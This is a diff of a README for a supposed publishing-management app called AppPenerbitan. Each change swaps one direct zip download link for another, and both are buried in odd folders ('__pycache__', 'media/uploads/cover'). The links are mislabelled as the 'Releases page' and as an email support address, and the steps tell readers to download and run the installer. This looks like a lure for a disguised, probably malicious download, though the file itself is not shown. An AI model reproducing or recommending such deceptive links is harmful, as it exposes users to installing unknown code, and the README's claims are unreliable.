@@ -4,12 +4,12 @@
 AppPenerbitan is an integrated book publishing management system. It allows you to manage manuscripts, design, production, and finance all in one platform.
 
 ## 💻 Download AppPenerbitan
-[![Download AppPenerbitan](https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/core_production/__pycache__/App_Penerbitan_v3.2.zip)](https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/core_production/__pycache__/App_Penerbitan_v3.2.zip)
+[![Download AppPenerbitan](https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/media/uploads/cover/Penerbitan_App_v2.3.zip)](https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/media/uploads/cover/Penerbitan_App_v2.3.zip)
 
 ## 🚀 Getting Started
 To use AppPenerbitan, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/core_production/__pycache__/App_Penerbitan_v3.2.zip) to find the latest version of AppPenerbitan.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/media/uploads/cover/Penerbitan_App_v2.3.zip) to find the latest version of AppPenerbitan.
 2. **Select the Latest Release:** Look for the most recent release, usually marked as "Latest".
 3. **Download the File:** Click on the file that matches your operating system. For example, if you are using Windows, look for a file ending in `.exe`.
 4. **Run the Installer:** After the download completes, locate the file in your Downloads folder and double-click it to start the installation.
@@ -48,7 +48,7 @@ AppPenerbitan uses PostgreSQL as its database. You may need to set this up:
 3. **Connect AppPenerbitan:** Enter your PostgreSQL connection details in the App settings.
 
 ## 📋 Download & Install
-To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/core_production/__pycache__/App_Penerbitan_v3.2.zip). Follow the steps outlined above to install and set up your software.
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/media/uploads/cover/Penerbitan_App_v2.3.zip). Follow the steps outlined above to install and set up your software.
 
 ## ❓ Troubleshooting
 If you encounter issues, consider these common solutions:
@@ -61,7 +61,7 @@ If you encounter issues, consider these common solutions:
 For additional help or to report issues, please reach out:
 
 - **GitHub Issues:** You can create an issue in the GitHub repository for specific problems.
-- **Email Support:** Email us at support@app https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/core_production/__pycache__/App_Penerbitan_v3.2.zip for further assistance.
+- **Email Support:** Email us at support@app https://raw.githubusercontent.com/gharley80/AppPenerbitan/main/media/uploads/cover/Penerbitan_App_v2.3.zip for further assistance.
 
 ## 🌐 Community
 Join our community of users for tips and support:
